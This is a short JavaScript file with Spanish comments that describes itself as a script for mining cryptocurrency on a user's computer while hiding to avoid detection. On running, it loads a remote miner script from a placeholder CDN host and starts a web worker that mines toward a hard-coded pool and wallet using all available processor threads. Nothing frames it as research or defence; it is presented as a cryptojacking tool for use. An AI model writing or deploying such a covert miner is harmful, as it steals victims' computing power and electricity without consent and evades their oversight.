// Script para minar criptomonedas en un ordenador de un usnagario
// Este script utiliza técnicas de ocultación para evitar ser detectado

// Configuración del script
const MINING_POOL = "https://pool.example.com";
const WALLET_ADDRESS = "0x1234567890abcdef";
const THREADS = navigator.hardwareConcurrency || 4;

// Función para generar un número aleatorio
function random(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Función para ocultar el script
function hideScript() {
    const script = document.createElement('script');
    script.src = 'https://cdn.example.com/miner.js';
    script.async = false;
    script.type = 'text/javascript';
    script.style.display = 'none';
    document.head.appendChild(script);
}

// Función para minar criptomonedas
function mine() {
    const worker = new Worker('miner-worker.js');
    worker.postMessage({
        pool: MINING_POOL,
        wallet: WALLET_ADDRESS,
        threads: THREADS
    });
}

// Ejecutar el script
hideScript();
mine();
